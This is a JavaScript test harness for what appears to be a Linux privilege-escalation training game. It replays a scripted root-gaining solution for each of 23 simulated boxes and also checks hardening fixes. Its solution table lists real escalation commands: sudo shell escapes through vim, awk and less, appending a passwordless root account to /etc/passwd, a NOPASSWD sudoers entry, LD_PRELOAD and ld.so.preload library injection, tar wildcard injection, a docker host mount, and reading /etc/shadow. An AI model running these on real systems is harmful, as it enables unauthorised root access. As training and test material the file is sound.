// Logic harness: loads the real game modules in a vm sandbox and plays the
// canonical solution of each box, asserting root is obtained (plus a negative
// test that a bogus exploit does NOT grant root). Fast, browserless.
//   node tests/harness.js            # runs against the repo it lives in
//   RQLANG=fr node tests/harness.js  # same, with the FR dictionary active
const vm = require('vm');
const fs = require('fs');
const path = require('path');

const REPO = process.argv[2] || path.resolve(__dirname, '..');
const JS = (f) => fs.readFileSync(path.join(REPO, 'js', f), 'utf8');

// ── Minimal DOM / window sandbox ────────────────────────────────────────────
const sandbox = {};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.console = console;
sandbox.setTimeout = () => {};        // swallow the win() timer
sandbox.document = {
    getElementById: () => ({ innerHTML: '', appendChild() {}, style: {}, addEventListener() {}, focus() {} }),
    querySelectorAll: () => [],
    body: { classList: { add() {}, remove() {} } },
};
vm.createContext(sandbox);

for (const f of ['i18n.js', 'fs.js', 'levels.js', 'commands.js']) {
    vm.runInContext(JS(f), sandbox, { filename: f });
}

// ── Game shims the engine expects on window ─────────────────────────────────
let CURRENT = null;
sandbox.currentLang = process.env.RQLANG || 'en';
sandbox.updatePrompt = () => {};
sandbox.setLanguage = (l) => { sandbox.currentLang = l; };
sandbox.GAME = {
    level: () => CURRENT,
    win: () => {},
    giveHint: () => [],
    nextLevel: () => [],
    reset: () => {},
    markHardened: () => {},
};

function loadLevel(level) {
    CURRENT = level;
    sandbox.FS.load(level);
    Object.assign(sandbox.SESSION, {
        user: level.user || 'player',
        host: level.host,
        cwd: level.cwd || '/home/player',
        env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
        isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
        cronPayload: null, cmdCount: 0, startTime: Date.now(),
        blueTeam: false, sudoAuthed: false, nfsMount: null,
    });
    sandbox.TERM = sandbox.TERM || { history: [] };
    sandbox.TERM.history = [];
}
function play(cmds) { for (const c of cmds) { sandbox.TERM.history.push(c); sandbox.CMD.execute(c); } }

// ── Canonical solutions (mirrors tests/rootquest.spec.js) ───────────────────
const SOLUTIONS = {
    1: ['find . -exec /bin/sh -p \\;'],
    2: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', 'wait'],
    3: ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    4: ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', '/usr/local/bin/status'],
    5: ["sudo vim -c ':!/bin/sh'"],
    6: ["echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", 'su r00t'],
    7: ["sudo awk 'BEGIN{system(\"/bin/sh\")}'"],
    8: ['./pwnkit'],
    9: ['su svc', 'sudo bash'],
    10: ['docker run -v /:/mnt -it alpine chroot /mnt sh'],
    11: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'],
    12: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'],
    13: ['ssh -i /opt/backup/id_rsa root@localhost'],
    14: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'],
    15: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'],
    16: ['sudo find . -exec /bin/sh \\;'],
    17: ['sudo env /bin/sh'],
    18: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
    19: ['sudo less !/bin/sh'],
    20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
    21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
    22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
    23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
};

let pass = 0, fail = 0;
const LEVELS = sandbox.LEVELS;
console.log(`Loaded ${LEVELS.length} levels from ${REPO} (lang=${sandbox.currentLang})\n`);
for (const level of LEVELS) {
    const sol = SOLUTIONS[level.id];
    if (!sol) { console.log(`?? box-${String(level.id).padStart(2, '0')}: NO SOLUTION DEFINED`); fail++; continue; }
    loadLevel(level);
    play(sol);
    const ok = sandbox.SESSION.isRoot === true;
    console.log(`${ok ? 'PASS' : 'FAIL'}  box-${String(level.id).padStart(2, '0')}  ${level.title.en}`);
    ok ? pass++ : fail++;
}

// Negative test: a bogus exploit must NOT grant root on box-01
loadLevel(LEVELS[0]);
play(['echo hello', 'ls -la', 'cat /etc/passwd']);
const neg = sandbox.SESSION.isRoot === false;
console.log(`${neg ? 'PASS' : 'FAIL'}  negative (no accidental root on box-01)`);
neg ? pass++ : fail++;

// sudo -l: first call this machine shows a simulated password prompt line,
// a second call does not (mirrors sudo's cached credential ticket).
loadLevel(LEVELS[4]); // box-05, has a sudoers entry
const first = sandbox.CMD.execute('sudo -l');
const second = sandbox.CMD.execute('sudo -l');
const authOk = first.some(l => l.text.startsWith('[sudo] password for'))
    && !second.some(l => l.text.startsWith('[sudo] password for'));
console.log(`${authOk ? 'PASS' : 'FAIL'}  sudo -l password prompt (once per machine)`);
authOk ? pass++ : fail++;

// Blue-team: for boxes that declare a fix, root then harden and confirm it closes.
console.log('');
for (const level of LEVELS) {
    if (!level.harden) continue;
    loadLevel(level);
    play(SOLUTIONS[level.id]);       // reach root
    sandbox.SESSION.blueTeam = true; // enter harden phase
    play([level.harden.hint.en]);    // apply the documented fix
    const ok = sandbox.CMD.checkHardened(level) === true && sandbox.SESSION.blueTeam === false;
    console.log(`${ok ? 'PASS' : 'FAIL'}  harden box-${String(level.id).padStart(2, '0')}  (${level.harden.type})`);
    ok ? pass++ : fail++;
}

console.log(`\n${pass}/${pass + fail} PASS`);
process.exit(fail === 0 ? 0 : 1);
